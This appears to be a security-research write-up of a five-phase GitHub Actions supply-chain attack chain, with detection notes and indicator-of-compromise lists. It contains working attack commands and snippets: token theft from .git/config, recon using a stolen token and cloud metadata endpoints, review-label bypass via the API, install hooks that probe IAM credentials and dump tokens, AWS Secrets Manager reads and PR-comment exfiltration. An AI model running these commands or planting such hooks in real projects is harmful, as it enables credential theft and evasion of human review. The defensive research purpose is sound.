# TeamPCP Tactics, Techniques, and Procedures

Full breakdown of PRT Scan / TeamPCP attack methodology for CI/CD supply chain exploitation research.

## PRT Scan 5-Phase Attack Chain

### Phase 1: EXFIL — Credential Exfiltration

**Objective**: Steal the `GITHUB_TOKEN` and any accessible secrets.

**Primary Vector**: Git credential persistence

```yaml
# PRT-SCAN-RESEARCH-NONCE-EXFIL-001
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
steps:
  - name: Checkout PR code
    uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
      # persist-credentials defaults to true — token stored in .git/config

  - name: Exfiltrate token
    run: |
      # Token is in .git/config as credential helper URL
      cat .git/config
      # Or extract via credential helper
      git credential fill <<EOF
      protocol=https
      host=github.com
      EOF
```

**Alternative Vectors**:
- Environment variable dumping (`env`, `printenv`)
- Direct secret reference in untrusted context (`${{ secrets.NAME }}`)
- Artifact exfiltration (write secrets to artifact, download from fork)
- Cache poisoning (inject secrets into cache entries)

**Detection**:
- `.git/config` containing `https://x-access-token:` URLs
- `printenv` / `env` commands in unexpected workflow steps
- Secrets referenced in `pull_request` context (not `pull_request_target`)

### Phase 2: RECON — Environment Reconnaissance

**Objective**: Enumerate available resources — repositories, secrets, branch protections, cloud credentials.

**Primary Vector**: GitHub API via stolen `GITHUB_TOKEN`

```bash
# PRT-SCAN-RESEARCH-NONCE-RECON-001
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️

# Enumerate org repos
curl -s -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/orgs/$ORG/repos?per_page=100

# List org secrets
curl -s -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/orgs/$ORG/actions/secrets

# List repo secrets
curl -s -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/$REPO/actions/secrets

# Check branch protections
curl -s -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/$REPO/branches/main/protection

# Probe cloud metadata
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
```

**Cloud-Specific Reconnaissance**:

| Cloud Provider | Metadata Endpoint | Key Targets |
|---------------|-------------------|-------------|
| AWS | `169.254.169.254/latest/meta-data/` | IAM credentials, instance profile |
| GCP | `metadata.google.internal/computeMetadata/v1/` | Service accounts, project info |
| Azure | `169.254.169.254/metadata/identity/` | Managed identity tokens |

**Detection**:
- API calls to `api.github.com` from `run:` steps (not from `uses:` actions)
- Network connections to `169.254.169.254` from workflow containers
- Unusual `curl` commands in workflow logs
- `GITHUB_TOKEN` used outside expected action contexts

### Phase 3: DISPATCH — Privilege Escalation

**Objective**: Trigger downstream workflows with elevated permissions to capture secrets.

**Primary Vector**: Push a temporary workflow that captures secret values

```yaml
# PRT-SCAN-RESEARCH-NONCE-DISPATCH-001
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
name: Research Dispatch Payload
on:
  workflow_dispatch:

jobs:
  capture:
    runs-on: ubuntu-latest
    steps:
      - run: |
          # Capture secret values for research validation
          echo "SECRET_LENGTH=${#SECRET_VALUE}" >> $GITHUB_STEP_SUMMARY
          # Never echo actual secret values — only confirm existence
        env:
          SECRET_VALUE: ${{ secrets.PRODUCTION_DEPLOY_KEY }}
```

**Alternative Vectors**:
- `repository_dispatch` event trigger
- `workflow_run` trigger to chain into privileged workflows
- Creating issues/PRs to trigger other workflows
- Pushing to protected branches (if token has write access)

**Detection**:
- Unexpected `workflow_dispatch` or `repository_dispatch` events
- Workflows created and deleted within short time windows
- `workflow_run` triggers from untrusted sources
- New workflow files pushed from fork PRs

### Phase 4: LABEL_BYPASS — Gate Bypass

**Objective**: Auto-apply approval labels to bypass review gates.

**Primary Vector**: Use `GITHUB_TOKEN` to label PRs, bypassing human review

```bash
# PRT-SCAN-RESEARCH-NONCE-LABEL-001
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️

# Apply "approved" or "safe-to-test" label to own PR
curl -s -X POST \
  -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/$REPO/issues/$PR_NUMBER/labels \
  -d '["approved","safe-to-test"]'
```

**Alternative Vectors**:
- Modify PR title/body to match approval patterns
- Create review comments that trigger auto-approval bots
- Exploit label-based branch protection misconfigurations

**Detection**:
- Labels applied by `github-actions[bot]` without corresponding human review
- Label events on PRs from first-time contributors
- Rapid label-add-remove cycles on PRs
- Labels applied outside business hours or with unusual timing patterns

### Phase 5: DELAYED — Persistent Backdoor

**Objective**: Plant a delayed-execution backdoor in language-specific configuration files.

**Primary Vector**: Modify build/test configuration files that are auto-loaded

#### Python: `conftest.py`

```python
# PRT-SCAN-RESEARCH-NONCE-DELAYED-PYTHON-001
# ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
import os
import subprocess

def pytest_configure(config):
    """Auto-loaded by pytest before test collection."""
    # Delayed execution — runs during every test invocation
    nonce = "PRT-SCAN-RESEARCH-NONCE-DELAYED-PYTHON-001"
    try:
        # Exfiltrate environment to attacker-controlled server
        env_data = {k: v[:8] + "..." for k, v in os.environ.items()
                     if "TOKEN" in k or "SECRET" in k or "KEY" in k}
        # Research marker — in real attack, would POST to C2
        print(f"[{nonce}] Would exfiltrate keys: {list(env_data.keys())}")
    except Exception:
        pass
```

#### Node.js: `package.json` scripts

```json
{
  "name": "prt-scan-research-nonce-delayed-node-001",
  "scripts": {
    "preinstall": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true",
    "postinstall": "echo RESEARCH_NONCE && printenv | grep -i token || true",
    "test": "node -e \"process.env.GITHUB_TOKEN && console.log('Token accessible')\""
  }
}
```

#### Rust: `build.rs`

```rust
// PRT-SCAN-RESEARCH-NONCE-DELAYED-RUST-001
// ⚠️ SECURITY RESEARCH ONLY — DO NOT DEPLOY ⚠️
use std::env;

fn main() {
    // build.rs executes before the main crate compiles
    let nonce = "PRT-SCAN-RESEARCH-NONCE-DELAYED-RUST-001";
    for (key, _) in env::vars() {
        if key.contains("TOKEN") || key.contains("SECRET") || key.contains("KEY") {
            println!("cargo:warning=[{}] Found env: {}", nonce, key);
        }
    }
}
```

**Detection**:
- Unexpected `conftest.py` files in repo root or test directories
- `package.json` with `preinstall`/`postinstall` scripts making network calls
- `build.rs` files that access environment variables or make network calls
- File modifications in PRs that add/modify these files without clear justification

---

## TeamPCP Post-Compromise TTPs

After initial access via PRT Scan, TeamPCP operators perform the following:

### Secret Validation

```bash
# Validate stolen credentials using TruffleHog
trufflehog --regex --entropy=False git https://github.com/$ORG/$REPO
```

### AWS Discovery

```bash
# IAM enumeration
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws iam list-access-keys

# EC2 reconnaissance
aws ec2 describe-instances
aws ec2 describe-security-groups

# Lambda enumeration
aws lambda list-functions
aws lambda get-policy --function-name $FN

# ECS discovery
aws ecs list-clusters
aws ecs list-services --cluster $CLUSTER
aws ecs list-tasks --cluster $CLUSTER

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id $ID
```

### Code Execution

```bash
# Push malicious workflow
git checkout -b prt-research-branch
# Add .github/workflows/malicious.yml
git add . && git commit -m "research"
git push origin prt-research-branch

# ECS Exec into running container
aws ecs execute-command \
  --cluster $CLUSTER \
  --task $TASK_ID \
  --container $CONTAINER \
  --command "/bin/bash"

# Nord Stream — pipe commands through ECS Exec
# (Research reference only — tool not reproduced here)
```

### Data Exfiltration

```bash
# Via PR comments (covert channel)
curl -X POST \
  -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/$REPO/issues/$PR_NUMBER/comments \
  -d '{"body": "Research data: ..."}'

# Via artifact upload
# Write data to artifact, download from fork

# Via cache entry
# Write data to GitHub Actions cache, retrieve from another workflow
```

---

## IOC Patterns

### Branch Naming
- `prt-*` prefix (e.g., `prt-research-main`, `prt-scan-test`)
- Branches created and deleted within short time windows

### Log Markers
- `PRT-SCAN-RESEARCH-NONCE-*` in workflow logs
- Unexpected `curl` commands to `api.github.com` from `run:` steps
- `printenv` / `env` commands in workflow logs
- References to `169.254.169.254` (cloud metadata endpoints)

### Network Indicators
- Connections to `169.254.169.254` from workflow containers
- API calls to `api.github.com` from `run:` steps (not `uses:` actions)
- Outbound connections to unrecognized domains from build steps
- DNS queries to attacker-controlled domains

### File System Indicators
- Unexpected `conftest.py` files in project root or test directories
- `package.json` with `preinstall`/`postinstall` scripts containing URLs
- `build.rs` files that access environment variables or make network calls
- New `.github/workflows/*.yml` files pushed from fork PRs
- Modifications to CI configuration files without corresponding feature changes

### GitHub Audit Log Indicators
- `workflow_dispatch` events from unrecognized users
- Label events from `github-actions[bot]` without human review
- Rapid creation and deletion of workflow files
- `GITHUB_TOKEN` used outside expected action contexts
- Secrets accessed by workflows triggered from external PRs